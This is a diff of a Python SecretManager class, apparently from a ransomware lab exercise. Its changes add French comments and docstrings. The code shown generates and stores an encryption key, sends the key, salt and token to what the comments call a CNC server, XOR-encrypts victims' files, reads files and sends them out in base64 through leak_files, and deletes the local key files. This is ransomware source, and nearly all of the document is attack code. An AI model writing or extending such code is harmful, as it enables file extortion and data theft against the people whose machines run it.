@@ -59,64 +59,70 @@ class SecretManager:
 
 
     def setup(self) -> None:
-        
+        """initilisation du stockage des clés et du token"""
         os.makedirs(self._path, exist_ok=True) #crée le répertoire s'il n'existe pas 
         token_path = os.path.join(self._path, "token.bin")
         key_path = os.path.join(self._path, "key.bin")
 
         if os.path.exists(token_path) and os.path.exists(key_path):
-            self.load()
+            self.load() #chargement des clés existantes si elles sontr déjà là 
             return
 
         salt, key, token = self.create()
-        self._key = key
+        self._key = key #stockage de la clé pour l'utilisér après
 
         with open(token_path, "wb") as f:
-            f.write(token)
+            f.write(token) #sauvegarde du token
 
         with open(key_path, "wb") as f:
-            f.write(key)  # Sauvegarde la clé !
+            f.write(key)  #sauvegarde de la clé 
 
         with open(os.path.join(self._path, "salt.bin"), "wb") as f:
-            f.write(salt)
+            f.write(salt) #sauvearde du sel
 
-        self.post_new(salt, key, token)
+        self.post_new(salt, key, token) #envoi au serveur CNC
 
-        self.load()
+        self.load() #rechargement des valeurs sauvegardées
 
     def load(self) -> None:
+        """charge les fichiers token, salt et key pour les utiliser"""
         token_path = os.path.join(self._path, "token.bin")
         salt_path = os.path.join(self._path, "salt.bin")
         key_path = os.path.join(self._path, "key.bin")
 
         with open(token_path, "rb") as f:
-            self._token = f.read()
+            self._token = f.read() #lecture du token
 
         with open(salt_path, "rb") as f:
-            self._salt = f.read()
+            self._salt = f.read() #lecture du sel
 
         if os.path.exists(key_path):
             with open(key_path, "rb") as f:
-                self._key = f.read()
+                self._key = f.read() #lecture de la clé
         else:
-            self._key = None
+            self._key = None # si la clé n'existe pas, on evite que ça plante avec cette ligne
 
     def check_key(self, candidate_key: bytes) -> bool:
+        """vérifie si la clé coorespond au token qui a été enregistré"""
         return self.do_derivation(self._salt, candidate_key) == self._token
 
     def set_key(self, b64_key: str) -> None:
+        """décode et stocke la clé en base64"""
         key = base64.b64decode(b64_key)
         self._key = key
 
     def get_hex_token(self) -> str:
+        """retourne le token en hexa"""
         return sha256(self._token).hexdigest()
 
     def xorfiles(self, files: List[str]) -> None:
+        """chiffre/déchiffre les fichiers .txt avec les clés"""
         for file in files:
             print(f"Chiffrement/Déchiffrement du fichier -> {file}")
             xorfile(file, self._key)
 
     def leak_files(self, files: List[str]) -> None:
+        """convertit les fichiers en base64 et les envoie au serveur"""
         for file in files:
             with open(file, "rb") as f:
                 encoded_data = self.bin_to_b64(f.read())
@@ -132,4 +138,4 @@ class SecretManager:
         """Supprime les fichiers contenant les clés"""
         os.remove(os.path.join(self._path, "token.bin"))
         os.remove(os.path.join(self._path, "salt.bin"))
-        os.remove(os.path.join(self._path, "key.bin")) 
+        os.remove(os.path.join(self._path, "key.bin")) #supprime la clé
